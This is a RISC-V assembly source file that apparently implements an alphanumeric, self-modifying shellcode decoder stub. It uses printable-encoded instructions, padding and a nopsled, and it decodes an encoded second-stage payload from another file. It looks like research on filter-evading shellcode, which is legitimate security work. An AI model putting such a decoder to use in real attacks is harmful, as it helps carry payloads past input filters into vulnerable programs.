/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

include(`../scripts/common.m4')#'

#define XP sp
.macro dangerous_nop2
    li     t1,-2
.endm

#ifndef COMPUTE_XP_FIXUP
/*# Defines 'xp_fixup' and 'end_nopsled' */
#include "xp_fixup.S"
#endif

.global _start
_start:
step0:
    repeat(2, {dangerous_nop2}) /*# Make sure sp will be aligned on 8 */
    .word 0x2F302F6F /*# This is the minimal 'jal reg, step1' */

load_values:
    .dword 0x4A33304242424242
    .dword 0x4242424242424242
    .dword 0x4A43504242424242
payload_pool:
    repeat(5484, {.half 0x4242})

step1: /*# Move 'link' register to XP */
    sra      s2, zero, s3 /*# s2 := 0 */
    sra      XP, t5, s2 /*# XP := t5 */

step2: /*# Load the majic step4 upper-word value (0xA031) */
    ld       s4, 16(XP)
    amoand.d a6, s4, (XP)
    amoand.d a6, s4, (XP)
    li       s4, 12
    sra      tp, a6, s4 /*# tp now contain the majic upper value */

    sra         s4, zero, s3   /*# s4 := 0 */
    amoand.d.rl zero, s4, (XP) /*# Zero one (now useless) load value */
    amoor.d.aq  a6, tp, (XP)   /*# Set the majic value */
    amoand.w    t5, s4, (XP)   /*# Zero the lower word */
    amoor.d     tp, s4, (XP)   /*# tp now contain the majic value */

step3: /*# Fixup XP (Need to have 'XP == step6') */
    #ifndef COMPUTE_XP_FIXUP
    xp_fixup
    #endif

step4: /*# Write stage2 */
.macro init_block
    sra         s4, zero, s3   /*# s4 := 0 */
    amoand.d.rl zero, s4, (XP) /*# Zero the word */
    amoor.d.aq  a6, tp, (XP)   /*# Set the majic word value */
    /*# We now need to set the lower word (easier said than done) */
.endm
.macro next_block
    /*# 'addi XP,XP,16', but gas chooses another non-alnum encoding */
    .short 0x6141
.endm
#include "stage2_encoded.S"

step5: /*# Nopsled to make up for loose ends. */
    #ifndef COMPUTE_XP_FIXUP
    end_nopsled
    #endif

step6: /*# Stage 2 will be decoded here */
    csrc  mip,sp
.global end
end:
